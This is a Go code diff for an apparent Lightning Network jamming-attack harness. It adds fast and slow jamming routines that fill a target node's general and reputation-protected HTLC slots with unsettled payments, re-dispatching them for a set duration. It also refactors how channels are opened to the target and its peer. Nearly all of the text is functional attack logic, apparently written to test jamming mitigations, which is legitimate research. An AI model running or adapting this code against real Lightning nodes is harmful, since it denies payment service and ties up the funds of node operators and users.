@@ -16,14 +16,14 @@ import (
 
 func runAttack(ctx context.Context, graph *GraphHarness,
 	jammer *JammingHarness, targetNode route.Vertex,
-	targetPeerAlias string) error {
+	targetPeerAlias string, slowJam bool) error {
 
-	node, err := graph.LookupByAlias(ctx, targetPeerAlias)
+	info, err := graph.GetTargetsInfo(ctx, targetPeerAlias, targetNode)
 	if err != nil {
 		return err
 	}
 
-	err = OpenChannels(ctx, graph, targetNode, node.PubKey)
+	err = OpenChannels(ctx, graph, info)
 	if err != nil {
 		return err
 	}
@@ -55,9 +55,12 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 	// 1. Slow jam general slots with one of our nodes
 	// 2. Build reputation for access to protected slots with the other
 	//
-	// Probing access to the protected slots can take some time, so we set
-	// a longer hold time that we'll run for our full jam.
-	chans, err := slowJamGeneral(ctx, jammer, finalSCIDs[0], time.Minute*20)
+	// We can set a very long hold time on our slow jam because we'll clean
+	// it up once we've finished with jamming the protected slots.
+	cancelSlowJam := make(chan struct{})
+	chans, err := slowJamGeneral(
+		ctx, jammer, finalSCIDs[0], time.Hour, cancelSlowJam,
+	)
 	if err != nil {
 		return fmt.Errorf("slow jamming: %w", err)
 	}
@@ -103,29 +106,201 @@ func runAttack(ctx context.Context, graph *GraphHarness,
 		return fmt.Errorf("Build protected reputation: %w", err)
 	}
 
-	protectedChans, err := jamProtected(ctx, jammer, zeroToTwo, time.Minute*10)
+	if slowJam {
+		// Run slow jam on protected slots, note
+		err = slowJamProtected(
+			ctx, jammer, zeroToTwo, time.Minute*10, finalSCIDs[1],
+		)
+	} else {
+		err = fastJamProtectedSlots(
+			ctx, jammer, zeroToTwo, time.Minute*10,
+		)
+	}
+	if err != nil {
+		return fmt.Errorf("Protected jam failure: %v", err)
+	}
+
+	close(cancelSlowJam)
+	log.Printf("Waiting for general jams to complete")
+	wg.Wait()
+
+	return nil
+}
+
+// Dispatches a fast jamming attack against the protected slots, blocking until
+// the desired jamming duration has passed.
+func fastJamProtectedSlots(ctx context.Context, j *JammingHarness,
+	route *lndclient.QueryRoutesResponse, duration time.Duration) error {
+
+	var (
+		wg sync.WaitGroup
+
+		// dispatch is used to signal that we need to dispatch another
+		// fast jamming payment because one has just completed. We send
+		// the result of the jamming payment that's just completed on it
+		// so that we can take a look at what happened in our latest
+		// completed payment. Buffered so we don't have to wait for
+		// all payment results to be read.
+		dispatch = make(chan JammingPaymentResp)
+
+		// cancelAll is a high level signal to shut down all payments.
+		cancelAll = make(chan struct{})
+	)
+
+	// Closure that will launch a fast jamming payment.
+	launchFastJam := func() (<-chan JammingPaymentResp, error) {
+		req := JammingPaymentReq{
+			AmtMsat:         route.TotalAmtMsat - route.TotalFeesMsat,
+			SourceIdx:       0,
+			DestIdx:         2,
+			EndorseOutgoing: true,
+			SettleWait:      time.Second * 60,
+			Settle:          false,
+			EarlySettle:     cancelAll,
+		}
+
+		resp, err := j.JammingPaymentRoute(ctx, req, *route)
+		if err != nil {
+			return nil, fmt.Errorf("fast jam: %v", err)
+		}
+
+		return resp, nil
+	}
+
+	// Closure that will consume the result of a fast jamming payment,
+	// sending a signal that we should dispatch another once it's completed.
+	watchFastJam := func(resp <-chan JammingPaymentResp) {
+		select {
+		// Always wait for payment to complete, unless we get a high
+		// level exit.
+		case r := <-resp:
+			select {
+			// Don't assume that we'll be able to send to the
+			// dispatch channel, if we're exiting we no longer
+			// care about receiving all of these results.
+			case dispatch <- r:
+			// If we're cancelling all payments, we can quit once
+			// we've got a result for this one (don't need to
+			// report it to the consumer).
+			case <-cancelAll:
+			case <-ctx.Done():
+			}
+
+		case <-ctx.Done():
+		}
+	}
+
+	// Launch an initial set of payments, watching each one individually.
+	for i := 0; i < 483/2; i++ {
+		rep, err := launchFastJam()
+		if err != nil {
+			log.Printf("Could not launch fast jam %v: %v", i, err)
+			break
+		}
+
+		wg.Add(1)
+		go func() {
+			defer wg.Done()
+			watchFastJam(rep)
+		}()
+
+		// We pause a few seconds to give ourselves some time to process
+		// the payments as they cancel so that we can better
+		// res-dispatch replacements once this initial set resolves.
+		if i%50 == 0 && i != 0 {
+			log.Printf("Introducing delay between initial jams: %v", i)
+			select {
+			case <-time.After(time.Second * 5):
+
+			case <-ctx.Done():
+				return ctx.Err()
+			}
+		}
+	}
+
+	var (
+		totalSent = 483 / 2
+		loopErr   error
+
+		// Once we've launched our initial set of jams, start the timer
+		// for the duration of our attack. We want to only start from
+		// the point where we've filled the slots with our first set of
+		// payments.
+		start = time.Now()
+		end   = start.Add(duration)
+	)
+
+	log.Println("Dispatched initial set of protected fast jamming payments")
+
+	// Loop that will keep dispatching new jams until we hit an error or
+	// our desired attack duration ends.
+dispatchLoop:
+	for {
+		if time.Now().After(end) {
+			log.Printf("Reached end of jamming attack: %v", end)
+			break dispatchLoop
+		}
+
+		select {
+		case r := <-dispatch:
+			// If a payment failed, we shouldn't dispatch any more.
+			if r.Err != nil {
+				loopErr = r.Err
+				break dispatchLoop
+			}
+
+			// Launch another payment in a goroutine so that we can
+			// dispatch as many as we need.
+			wg.Add(1)
+			go func() {
+				defer wg.Done()
+
+				rep, err := launchFastJam()
+				if err != nil {
+					log.Printf("Could not launch fast jam: %v", err)
+				}
+
+				watchFastJam(rep)
+			}()
+
+			totalSent++
+			if totalSent%200 == 0 {
+				log.Printf("Dispatched: %v fast jams", totalSent)
+			}
+
+		case <-ctx.Done():
+			return ctx.Err()
+		}
+	}
+
+	close(cancelAll)
+
+	log.Println("Waiting for fast jams to complete")
+	wg.Wait()
+	return loopErr
+}
+
+// Dispatches slow jamming attack against protected slots, blocking until the
+// payments have completed (after the duration provided).
+func slowJamProtected(ctx context.Context, jammer *JammingHarness,
+	route *lndclient.QueryRoutesResponse, duration time.Duration,
+	lastChannel lnwire.ShortChannelID) error {
+
+	protectedChans, err := jamProtected(ctx, jammer, route, duration)
 	if err != nil {
 		return fmt.Errorf("slow jam protected: %w", err)
 	}
 
-	log.Printf("Dispatched: %v protected slow jams over: %v", len(chans),
-		finalSCIDs[1].ToUint64())
+	log.Printf("Dispatched: %v protected slow jams over: %v",
+		len(protectedChans), lastChannel.ToUint64())
 
-	wg.Add(1)
-	go func() {
-		defer wg.Done()
+	log.Printf("Waiting for: %v protected slow jams", len(protectedChans))
+	results, err := waitForJams(ctx, protectedChans)
+	if err != nil {
+		log.Printf("Wait for protected jams: %v", err)
+	}
 
-		log.Printf("Waiting for: %v protected slow jams", len(protectedChans))
-		results, err := waitForJams(ctx, protectedChans)
-		if err != nil {
-			log.Printf("Wait for protected jams: %v", err)
-		}
-
-		log.Printf("Protected jams: %v", results)
-	}()
-
-	log.Printf("Waiting for slow jams to complete")
-	wg.Wait()
+	log.Printf("Protected jams: %v", results)
 
 	return nil
 }
@@ -153,8 +328,6 @@ func waitForJams(ctx context.Context, jams []jamPair) (*paymentReport, error) {
 		case <-ctx.Done():
 			err = ctx.Err()
 		}
-
-		close(jam.req.EarlySettle)
 	}
 
 	return results, err
@@ -229,7 +402,8 @@ func jamProtected(ctx context.Context, j *JammingHarness,
 }
 
 func slowJamGeneral(ctx context.Context, j *JammingHarness,
-	lastChannel lnwire.ShortChannelID, holdTime time.Duration) (
+	lastChannel lnwire.ShortChannelID, holdTime time.Duration,
+	cancel chan struct{}) (
 	[]jamPair, error) {
 
 	// Just above the dust limit.
@@ -263,7 +437,7 @@ func slowJamGeneral(ctx context.Context, j *JammingHarness,
 			EndorseOutgoing: false,
 			SettleWait:      wait,
 			Settle:          false,
-			EarlySettle:     make(chan struct{}),
+			EarlySettle:     cancel,
 		}
 
 		if i%50 == 0 && i != 0 {
@@ -793,14 +967,14 @@ func BuildReputation(ctx context.Context, j *JammingHarness) (bool,
 //
 //		|
 //	    LND1
-func OpenChannels(ctx context.Context, graph *GraphHarness, targetNode,
-	targetPeer route.Vertex) error {
+func OpenChannels(ctx context.Context, graph *GraphHarness,
+	info *TargetsInfo) error {
 
 	// LND0 -> Target
 	chanCap := funding.MaxBtcFundingAmount
 	chan1, err := graph.OpenChannel(ctx, OpenChannelReq{
 		Source:      0,
-		Dest:        targetNode,
+		Dest:        info.Target,
 		CapacitySat: chanCap,
 		PushAmt:     chanCap / 2,
 	})
@@ -808,12 +982,12 @@ func OpenChannels(ctx context.Context, graph *GraphHarness, targetNode,
 		return fmt.Errorf("LND-0 -> target: %v", err)
 	}
 
-	log.Printf("Opened channel with target node (%s) from LND-0", targetNode)
+	log.Printf("Opened channel with target node (%s) from LND-0", info.Target)
 
 	// LND-1 -> Target
 	chan2, err := graph.OpenChannel(ctx, OpenChannelReq{
 		Source:      1,
-		Dest:        targetNode,
+		Dest:        info.Target,
 		CapacitySat: chanCap,
 		PushAmt:     chanCap / 2,
 	})
@@ -821,12 +995,12 @@ func OpenChannels(ctx context.Context, graph *GraphHarness, targetNode,
 		return fmt.Errorf("LND-1 -> target: %v", err)
 	}
 
-	log.Printf("Opened channel with target node (%s) from LND-1", targetNode)
+	log.Printf("Opened channel with target node (%s) from LND-1", info.Target)
 
 	// LND-2 -> Peer x2
 	req := OpenChannelReq{
 		Source:      2,
-		Dest:        targetPeer,
+		Dest:        info.Peer,
 		CapacitySat: chanCap,
 		// We still give ourselves some liquidity so that we don't
 		// run into fee spike buffer issues.
@@ -837,14 +1011,14 @@ func OpenChannels(ctx context.Context, graph *GraphHarness, targetNode,
 		return fmt.Errorf("LND-2 -> target peer: %v", err)
 	}
 	log.Printf("Opened channel 1 with target peer (%s) from LND-2",
-		targetPeer)
+		info.Peer)
 
 	chan4, err := graph.OpenChannel(ctx, req)
 	if err != nil {
 		return fmt.Errorf("LND-2 -> target peer: %v", err)
 	}
 	log.Printf("Opened channel 2 with target peer (%s) from LND-2",
-		targetPeer)
+		info.Peer)
 
 	// Wait for channels to reflect in graphs.
 	fmt.Println("Waiting for channels to reflect in graphs")
